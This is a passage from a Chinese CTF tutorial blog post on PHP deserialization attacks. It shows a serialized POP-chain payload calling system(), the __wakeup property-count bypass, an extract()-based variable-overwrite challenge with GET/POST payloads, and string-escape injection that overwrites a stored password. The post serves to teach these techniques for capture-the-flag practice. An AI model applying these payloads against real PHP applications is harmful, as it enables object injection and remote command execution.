urlencode(serialize($class000));</span></span><br><span class="line"><span class="comment">//输出序列化结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:8:&quot;class000&quot;:2:&#123;s:7:&quot;payl0ad&quot;;i:1;s:4:&quot;what&quot;;O:8:&quot;class001&quot;:2:&#123;s:7:&quot;payl0ad&quot;;s:9:&quot;dangerous&quot;;s:1:&quot;a&quot;;O:8:&quot;class002&quot;:1:&#123;s:3:&quot;sec&quot;;O:8:&quot;class003&quot;:1:&#123;s:5:&quot;mystr&quot;;s:21:&quot;system(&#x27;echo $FLAG&#x27;);&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="wakeup绕过">wakeup绕过</h2>
+<blockquote>
+<p>PHP5 &lt; 5.6.25</p>
+<p>PHP7 &lt; 7.0.10</p>
+</blockquote>
+<p>__wakeup() //执行unserialize()时，先会调用这个函数</p>
+<p>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行</p>
+<p>题目中的wakeup通常会用die()函数阻止反序列化的进行,这时我们只需要修改属性个数值即可绕过</p>
+<p>例如:将<code>O:4:&quot;test&quot;:1:&#123;xxx&#125;</code>修改为<code>O:4:&quot;test&quot;:2:&#123;xxx&#125;</code></p>
+<h2 id="变量覆盖">变量覆盖</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pucky</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;wq&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pucky</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$pucky</span>===<span class="string">&quot;二仙桥&quot;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$pucky</span>===<span class="string">&quot;二仙桥&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;window, alert(&#x27;说说看, 你要去哪??&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$pucky</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">popmart</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$yuki</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$molly</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dimoo</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;yuki=<span class="string">&#x27;tell me where&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;molly=<span class="string">&#x27;dont_tell_you&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;dimoo=<span class="string">&quot;you_can_guess&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$where_you_go</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;yuki=<span class="variable">$where_you_go</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;molly === <span class="variable language_">$this</span>-&gt;yuki)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本题中我们的目标就是让$yuki=$where_you_go=$molly=“dont_tell_you”</p>
+<p>并且在第一个代码块中可以看到extract(),可以修改$pucky的值绕开die()</p>
+<p>这时我们需要在POST时候给全局变量$where_you_go赋值&quot;dont_tell_you&quot;</p>
+<p>然后再赋值$pucky即可</p>
+<p><strong>payload:</strong></p>
+<p><strong>GET：</strong><code>?wq=二仙桥</code></p>
+<p><strong>POST：</strong><code>where_you_go=dont_tell_you&amp;pucky=O:7:&quot;popmart&quot;:3:&#123;s:4:&quot;yuki&quot;;s:13:&quot;tell me where&quot;;s:5:&quot;molly&quot;;s:13:&quot;dont_tell_you&quot;;s:5:&quot;dimoo&quot;;s:13:&quot;you_can_guess&quot;;&#125;</code></p>
+<h2 id="字符串逃逸">字符串逃逸</h2>
+<p>原理:序列化与反序列化遇到对内容字符进行替换时,原本的字符统计的数量并不会改变,且对<code>&quot;;&#125;</code>的检查过于简单</p>
+<p>利用点:源码中存在对可控参数值内容进行替换的函数,分为增多和减少两种</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#目标将密码改为123456</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  	<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  			<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;yy&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  	function filter($str)&#123;</span></span><br><span class="line"><span class="comment">  			return str_replace(&#x27;x&#x27;,&#x27;yy&#x27;,$str);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">		<span class="variable">$username</span> = <span class="string">&quot;Nanian2333&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span> = <span class="string">&quot;strong password&quot;</span>;</span><br><span class="line">		<span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>正常情况:</strong><code>a:2:&#123;i:0;s:9:&quot;Nanian2333&quot;;i:1;s:15:&quot;strong password&quot;;&#125;</code></p>
+<p><strong>理想:</strong><code>a:2:&#123;i:0;s:9:&quot;Nanian2333&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></p>
+<p><strong>关键代码</strong><code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></p>
+</br>
+<p>我们的目标就是把<strong>Nanian2333</strong>后面的<code>&quot;;i:1;s:15:&quot;strong password&quot;;&#125;</code>30位全部算入到数组array的第一个元素中去</p>
+<p>然后拼接<strong>关键代码</strong><code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>即可修改密码</p>
+</br>
+<ol>
+<li>字符减少情况:</li>
+</ol>
+<p>当我们传入<code>Nanian2333yyyyyyy...yy</code> 60个<code>y</code>就会替换为30个<code>x</code>,收缩30位,使得<code>;i:1;s:6:&quot;123456&quot;;&#125;</code>逃逸出来</p>
+<p><strong>payload:</strong><code>a:2:&#123;i:0;s:70:&quot;Nanian2333yyyyyyyy...yy&quot;;i:1;s:15:&quot;strong password&quot;;&#125;&quot;</code> <code>;i:1;s:6:&quot;123456&quot;;&#125;</code></p>
+<p><strong>输出:</strong>       <code>a:2:&#123;i:0;s:70:&quot;Nanian2333xxxxxxxx...xx&quot;;i:1;s:15:&quot;strong password&quot;;&#125;&quot;</code> <code>;i:1;s:6:&quot;123456&quot;;&#125;</code></p>
+<p><code>Nanian2333xxx..xx</code>只占了40位,剩下30位分给了<code>&quot;;i:1;s:15:&quot;strong password&quot;;&#125;</code></p>
+<p>所以这一整块都被放进了第一个元素值中,然后后面的<code>;i:1;s:6:&quot;123456&quot;;&#125;</code>就被理所当然的当成了元素2的值,从而成功修改密码为123456</p>
+<ol start="2">
+<li>字符增多情况:</li>
+</ol>
+<p>当我们传入``Nanian2333xxx…xx<code> 20个</code>x<code>就会替换为40个</code>y<code>,溢出20位,使得</code>;i:1;s:6:“123456”;}`逃逸出来</p>
+<p>这里要手工修改username的字符数统计为70</p>
+<p><strong>payload:</strong><code>a:2:&#123;i:0;s:70:&quot;Nanian2333yyyyyyyy...yy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> <code>;i:1;s:15:&quot;strong password&quot;;&#125;</code></p>
+<p><strong>输出:</strong>       <code>a:2:&#123;i:0;s:70:&quot;Nanian2333yyyyyyyy...yy&quot;</code> <code>;i:1;s:6:&quot;123456&quot;;&#125;</code> <code>;i:1;s:15:&quot;strong password&quot;;&#125;</code></p>
+<p>第一部分70包住了整个<code>Nanian2333yyyyyyyy...yy</code>第二部分也正常进行,而最后部分则因为前面已经闭合了所以直接不管掉了</p>
+</br>
+<p><strong>总结:</strong></p>
+<p><strong>减少是将关键代码<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>手工添加在payload后面,对$username的值进行修改</strong></p>
+<p><strong>使其替换后能包裹住我们不想要的<code>&quot;;i:1;s:15:&quot;strong password&quot;;&#125;</code></strong></p>
+</br>
+<p><strong>增多是将关键代码<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>直接放入$username的值中,当$username溢出时,关键代码就变成了独立的一部分执行</strong></p>
+<p><strong>且<code>&quot;;&#125;</code>提前结束除掉了我们不想要的<code>&quot;;i:1;s:15:&quot;strong password&quot;;&#125;</code></strong></p>
+<h2 id="未完待续">未完待续</h2>
+<h3 id="phar">phar</h3>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/122930867">phar反序列化+两道CTF例题_ctf phar-CSDN博客</a></p>
+<h3 id="php-session">php session</h3>
+<p>session.serialize_handler</p>
+<h3 id="指针引用">指针引用</h3>
+</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>php反序列化</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://nanian-233.github.io/posts/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">https://nanian-233.github.io/posts/php反序列化.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>Nanian233🍊</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-12-25</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-12-25</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>CTF</a><a class="post-meta__tags" href="/tags/WEB/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>WEB</a><a class="post-meta__tags" href="/tags/PHP/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>PHP</a></div></div><link rel="stylesheet" href="/css/coin.css" media="defer" onload="this.media='all'"/><div class="post-reward"><button class="tip-button reward-button"><span class="tip-button__text">投喂作者</span><div class="coin-wrapper"><div class="coin"><div class="coin__middle"></div><div class="coin__back"></div><div class="coin__front"></div></div></div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/assets/weixin.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/assets/weixin.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/assets/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/assets/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></button></div><audio id="coinAudio" src="https://npm.elemecdn.com/akilar-candyassets@1.0.36/audio/aowu.m4a"></audio><script defer="defer" src="/js/coin.js"></script><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/PHPtx.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/10/30/-1.png" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP特性</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/%E6%97%A0%E5%8F%82RCE.html" title="无参RCE"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/05/05/_202405052101083.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-14</div><div class="title">无参RCE</div></div></a></div><div><a href="/posts/PHPtx.html" title="PHP特性"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/10/30/-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-27</div><div class="title">PHP特性</div></div></a></div><div><a href="/posts/BaseCTF2024.html" title="BaseCTF 2024"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/07/25/_202407252316151.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-21</div><div class="title">BaseCTF 2024</div></div></a></div><div><a href="/posts/FSCTF2023.html" title="FSCTF 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/03/19/e088f040cc4a42d2866bf23364767098.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-06</div><div class="title">FSCTF 2023</div></div></a></div><div><a href="/posts/ISCTF2023%5B3%5D.html" title="ISCTF 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/03/19/7c125e71d6bd478aa288abe3ac25672e.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-07</div><div class="title">ISCTF 2023</div></div></a></div><div><a href="/posts/Hackergame2023.html" title="中国科学技术大学第十届信息安全大赛"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/03/19/773dfeee96fd40ba946f0b7f62454522.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-07</div><div class="title">中国科学技术大学第十届信息安全大赛</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><svg class="meta_icon" style="width:22px;height:22px;position:relative;top:5px"><use xlink:href="#icon-mulu1"></use></svg><span style="font-weight:bold">目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-text">关键函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%80%A7"><span class="toc-text">不同成员变量可访问性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">常用魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-text">POP链构造*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wakeup%E7%BB%95%E8%BF%87"><span class="toc-text">wakeup绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-text">字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD"><span class="toc-text">未完待续</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar"><span class="toc-text">phar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-session"><span class="toc-text">php session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8"><span class="toc-text">指针引用</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>在夜空所有星星熄灭的时候，所有梦想、所有溪流，都能汇入同一片大海中，那时我们终会相见✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://ys.mihoyo.com/">点击开启提瓦特之旅</a></div></div></div><div class="t-t-r"></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链⌛</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://g1at.github.io/" title="g0at"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/05/01/image.webp" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://0swald-blog.notion.site/" title="0swald"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/05/01/image.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/" title="str1ke4fun"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/05/01/image-3.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://j-0k3r.github.io/" title="J_0k3r"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/05/01/image-1.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/GGbomb" title="GGbomb"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/05/01/image-2.jpg" alt=""/></a></div></div></div></div><div class="copyright"><span><b>&copy;2024</b></span><span><b>&nbsp;&nbsp;By Nanian233🍊</b></span></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Copyright-BY--NC--SA--4.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="右键模式" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog right_side"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button class="share" type="button" title="分享链接" onclick="share()"><i class="fas fa-share-nodes"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>百度搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>空降评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:randomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item" href="/personal/about/"><i class="fa fa-info-circle"></i><span>关于博客</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>美化设置</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>切换全屏</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>打印页面</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())
+setTimeout(function(){preloader.endLoading();}, 5000);
+document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>(()=>{
+  const init = () => {
